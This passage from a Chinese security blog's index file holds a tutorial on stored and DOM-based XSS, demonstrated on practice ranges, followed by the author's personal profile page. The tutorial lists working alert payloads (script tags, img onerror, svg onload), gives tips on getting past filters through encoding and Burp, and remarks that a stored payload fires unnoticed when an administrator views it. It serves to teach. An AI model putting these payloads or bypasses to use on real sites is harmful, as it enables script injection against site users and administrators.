punctuation">></span></span></span></code></pre><p>可以看到的是，先在第一段部分，接受用户的内容，第二段是将内容插入<br>数据库，第三个回显内容就是从数据库查询。<br>（其实那2个php可以合成一个php，但是我不想，懒得）<br>具体内容我在反射型xss已经讲过了，可以狭义的概述</p><blockquote><p><code>存储型xss</code>：<strong>用户输入内容插入了数据库，内存，文件等其他地方。然后再次访问的时候没有输入payload，就会自动弹窗</strong><br>（例如留言板，或者个人资料修改。第一次插入后，连续访问还自动弹窗，说明这就是存储型xss）</p><p><code>反射型xss</code>：<strong>用户想要利用，就得输入一次payload</strong> （例如在搜索处发现xss，想要让他弹窗，就得重新输入一遍）</p></blockquote><p><strong>3. 靶场演示</strong><br>通过源码，我们知道这是这是输出xss表中的内容<br>我们先看下xss表有没有内容<br><img src="https://img-blog.csdnimg.cn/20200317113852628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>发现没有内容，这时候我们进入靶场先插入id和name<br><img src="https://img-blog.csdnimg.cn/20200317113948174.png" alt="在这里插入图片描述"><br>然后会输出我们的名字<br><img src="https://img-blog.csdnimg.cn/20200317114029746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>这时候就成功的输出了，我们查看下xss这个表中有没有内容<br><img src="https://img-blog.csdnimg.cn/20200317114118487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候发现有条内容了。说明我们插入，或者我们平时注册的时候<br>会插入数据库等等，一般在网站后台可以看到</p><blockquote><p>我应该把上面的第三个php输出内容的代码单独拿出来，模拟管理员访问的页面 QAQ 但是写到这里了，我也不想弄，大概理解个意思就好了</p></blockquote><p>然后我把xss表内容删除掉，插入我们恶意语句的代码<br><img src="https://img-blog.csdnimg.cn/20200317114930473.png" alt="在这里插入图片描述"><br>payload：<code>&lt;script&gt;alert(\&#39;Young\&#39;)&lt;/script&gt;</code><br>这是提交，发现弹窗了<br><img src="https://img-blog.csdnimg.cn/20200317115039712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意这里为啥没有回显内容，因为他把我们输入的内容当做代码执行了，所以没有显示<br>（你见过执行的代码会显示给用户嘛 QAQ）<br><img src="https://img-blog.csdnimg.cn/20200317115153286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候发现数据库有了一条数据，那就是我们插入的数据<br>恶意的js语句<br>这种存储型xss漏洞存在于，留言板，个人资料等等<br>因为会保存进数据库，然后在后台显示，所以后台管理员只要看到这条信息<br>他就中招了</p><blockquote><p>至于会不会被发现，这个就不用担心，内容会被当做代码执行，所以不会显示的</p></blockquote><p>我们可以查看一下掌控安全的靶场<br><img src="https://img-blog.csdnimg.cn/20200317115651421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候点击一下查看留言，因为好多人都会在这里插<br>（你也可以在留言反馈那边弹一条）<br><img src="https://img-blog.csdnimg.cn/20200317115807285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而也不知道是谁在这插，插这么多，我点不完。所以就不演示了</p><h1 id="0x02-Dom型xss"><a href="#0x02-Dom型xss" class="headerlink" title="0x02.Dom型xss"></a>0x02.Dom型xss</h1><hr>**什么是 dom—based xss？**`狭义的总结`：原本不应该出现xss的地方，但是经过javascript的操作之后产生了xss<p>这里涉及到了document对象的一些操作，看过前面偏移注入的话应该知道<br><code>document.cookie</code>  这样的话就是查看自己的cookie<br><img src="https://img-blog.csdnimg.cn/20200317141516218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>这里的话也可以使用下面这条命令，判断是否伪静态<br>如果使用这条的话，时间再不断的变化，就是动态</p><p><code>document.lastModifiled</code></p><p>还有其他的一些方法<br><img src="https://img-blog.csdnimg.cn/20200317142919710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里具体讲<code>document.write()</code><br>这个有啥用？<br>其实就是在页面上面输出<br><img src="https://img-blog.csdnimg.cn/20200317143505236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先判断下是不是动态页面，然后再写<br><code>document.write(&quot;young&quot;)</code><br>要write什么可以自己定义<br><img src="https://img-blog.csdnimg.cn/20200317143432531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然而上面提到了，其实这个write() 也是个js语句<br>接受编码，那我们试着将下面这个编码，看会不会弹窗<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200317144009626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>编码后再使用document.write()写入<br><img src="https://img-blog.csdnimg.cn/20200317144052305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>发现这里弹窗了<del>~<br>我们通过js编码后，它成功的弹窗了<br>（但是这个不是漏洞，这里想说的是，像document.write() 会自动对编码进行解码</del>）</p><p>似乎扯的有点远了，但是如果被拦截了<br>这里可以通过Js代码的解码，去进行绕过 QAQ<br>然而xss的时候，也可以使用burp<br>因为有可能前端有限制，但是数据包没有</p><p>例如还有比较偏的，在上传头像的地方打xss QAQ</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p>这里的话借用靶场，因为我觉得这个靶场很容易讲的话很容易理解<br><img src="https://img-blog.csdnimg.cn/20200317152317345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt><br>通过审查源码，我们可以发现，这里是document.write()进行输出到页面上的<br>这时候我们可以尝试的，也在这个页面弹窗，通过修改发现，这个输入点是在url那边<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>这时候发现，似乎没有弹窗<br><img src="https://img-blog.csdnimg.cn/20200317152801970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是注意看，我们输入的内容，已经被<code>&lt;script&gt;</code>给包围了<br>这时候我们用其他的语句测试<br><code>&lt;img src=a onerror=alert(1) /&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200317152957637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时候成功的弹窗了，说明了我们输入的内容被执行了<br>可以简单理解成，标签内不可以使用<code>&lt;script&gt;</code></p><p>其他常用的弹窗语句<br>1.<code>&lt;img src=a onerror=alert(1) &gt;</code><br>2.<code>&lt;svg onload=alert(1)&gt;</code><br>这几个是我经常用的</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>dom型xss其实本质上还是反射型xss，他没有与数据库交互，没次想要弹窗，都需要输入一次payload<br>对dom型xss没有深入了解</p><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊<br><img src="https://img-blog.csdnimg.cn/20200317153445786.png" alt="尴尬"></p>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Who Are Me?</title>
      <link href="/2020/03165880.html"/>
      <url>/2020/03165880.html</url>
      
        <content type="html"><![CDATA[<h3 id="在下尘世中的一届小白，辣鸡中的战斗机"><a href="#在下尘世中的一届小白，辣鸡中的战斗机" class="headerlink" title="在下尘世中的一届小白，辣鸡中的战斗机"></a>在下尘世中的一届小白，辣鸡中的战斗机</h3><p>在安全圈内的一个混子选手，打王者也是王者里面的混子</p><p>所以只能不断的去论坛学习学习，但是没办法，我就是个靓仔<br><img src="https://img-blog.csdnimg.cn/20200316174518780.jpg" alt="这是靓仔"><br>———————————————————————————————————————————————————</p><h2 id="关于我这个战斗机的简介"><a href="#关于我这个战斗机的简介" class="headerlink" title="关于我这个战斗机的简介"></a>关于我这个战斗机的简介</h2><p><code>ID</code>：Young，youngboy，0X7E<br><code>职业</code>：无QAQ<br><code>性格</code>：外冷内也冷，比较内向，闷骚屌丝…<br><code>住址</code>：怕被那啥，还是保密一下下<br><code>喜欢看的剧</code>：我在未来等你，大唐女法医<br><code>最喜欢的人</code>: lyt<br><code>喜欢的游戏</code>：也就一个王者荣耀吧（鄙人就是小学生）<br><code>其他爱好</code>：  打游戏，看书，游泳，听歌<br><code>一些经历</code>：也就挖过洞，在各大src飘荡不小心上了个榜。无聊的时候挖了几张cnvd，然后就没啥了吧<br><code>为什么做安全</code>：<br>做安全只是为了兴趣，看看这么装逼能不能找个女朋友。小时候电影看多了趴<br>              做安全为兴趣的同时也赚点钱不然就吃土了<br><code>最后悔的事</code>：<br>说实话，我最后悔的事就是和我前女友分手，她叫lyt。因为我当时比较那么一点烦躁，然后大晚上，脑子不好使就提出了分手这事，说实话。我现在很后悔很后悔，没有她的陪伴，我觉得我每天的日子都很枯燥，如果妳看到的话，能回来吗？我一直在等你</p><p><code>花开又花落，终究是无奈的不舍</code></p><p>———————————————————————————————————————————————————</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>预计发展方向：二进制(正在学习) -&gt; 内网渗透 -&gt; java代码审计</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
